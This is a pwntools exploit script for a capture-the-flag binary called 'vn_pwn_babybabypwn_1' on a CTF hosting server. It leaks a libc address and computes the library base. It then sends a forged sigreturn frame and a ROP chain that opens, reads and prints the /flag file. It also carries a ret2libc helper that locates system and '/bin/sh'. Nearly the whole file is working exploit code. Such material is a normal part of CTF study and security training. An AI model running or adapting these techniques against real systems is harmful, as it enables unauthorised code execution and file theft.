from pwn import  *
from LibcSearcher import LibcSearcher
from sys import argv

def ret2libc(leak, func, path=''):
	if path == '':
		libc = LibcSearcher(func, leak)
		base = leak - libc.dump(func)
		system = base + libc.dump('system')
		binsh = base + libc.dump('str_bin_sh')
	else:
		libc = ELF(path)
		base = leak - libc.sym[func]
		system = base + libc.sym['system']
		binsh = base + libc.search('/bin/sh').next()

	return (system, binsh)

s       = lambda data               :p.send(str(data))
sa      = lambda delim,data         :p.sendafter(str(delim), str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda delim,data         :p.sendlineafter(str(delim), str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,'\0'))
uu64    = lambda data               :u64(data.ljust(8,'\0'))
leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))

context.log_level = 'DEBUG'
binary = './vn_pwn_babybabypwn_1'
context.binary = binary
elf = ELF(binary,checksec=False)
p = remote('node3.buuoj.cn',29230) if argv[1]=='r' else process(binary)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6',checksec=False)
#libc = ELF('./glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so',checksec=False)

def dbg():
	gdb.attach(p)
	pause()

_add,_free,_edit,_show = 1,4,2,3
def add(size,content='a'):
	sla(':',str(_add))
	sla('?',str(size))
	sa(':',content)

def free(index):
	sla(':',str(_free))
	sla('?',str(index))

def edit(index,content):
	sla(':',str(_edit))
	sla('?',str(index))
	sa(':',content)

def show(index):
	sla(':',str(_show))
	sla('?',str(index))

# start
ru('0x')
puts = int(ru('\n'),16)
base = puts-libc.sym['puts']
leak('base',base)
pop_rdi = base+0x21102
pop2 = base+0x1150c9
syscall = base+libc.sym['syscall']
open = base+libc.sym['open']
read = base+libc.sym['read']
buf = base+0x3c6500

frame  = p64(0) * 12
frame += p64(0)         # rdi
frame += p64(0)         # rsi
frame += p64(0)         # rbp
frame += p64(0)         # rbx
frame += p64(buf-0x10)  # rdx
frame += p64(0)         # rax
frame += p64(0x100)     # rcx
frame += p64(buf)       # rsp
frame += p64(syscall)   # rip
frame += p64(0)         # eflags
frame += p64(0x33)      # cs/fs/gs
frame += p64(0)*7
sa('message:',frame)

chain = [
	'/flag\x00\x00\x00',0,
	# open(buf-0x10,0,0)
	pop_rdi,buf-0x10,pop2,0,0,open,
	# read(3,buf+0x100,0x100)
	pop_rdi,3,pop2,0x100,buf+0x100,read,
	# puts(buf+0x100)
	pop_rdi,buf+0x100,puts
]
s(flat(chain))
# end

itr()